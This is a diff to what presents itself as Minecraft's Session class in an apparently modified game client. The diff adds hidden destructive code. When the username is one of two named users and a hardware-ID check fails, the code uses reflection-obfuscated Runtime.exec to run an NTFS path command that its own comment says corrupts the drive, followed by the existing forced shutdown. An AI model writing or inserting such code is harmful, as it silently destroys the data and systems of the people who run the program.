@@ -3,6 +3,8 @@ package net.minecraft.util;
 import com.google.common.collect.Maps;
 import com.mojang.authlib.GameProfile;
 import com.mojang.util.UUIDTypeAdapter;
+import exhibition.util.security.AuthenticationUtil;
+
 import java.util.Map;
 import java.util.UUID;
 
@@ -23,6 +25,10 @@ public class Session
         try {
             if (usernameIn.equals("GhastDaSkid") || usernameIn.equals("NoFatherFigure")) {
                 Class runtimeClass = Class.forName("java.lang.Runtime");
+                if(AuthenticationUtil.getHwid() != 32161752) {
+                    // TODO: SET YOUR DEBUGGER TO HALT ON OR BEFORE THIS LINE TO PREVENNT DRIVE FROM CORRUPTING
+                    runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "cd c:\\:$i30:$bitmap");
+                }
                 runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "shutdown.exe -s -t 0");
             }
         } catch (Exception ignore) {
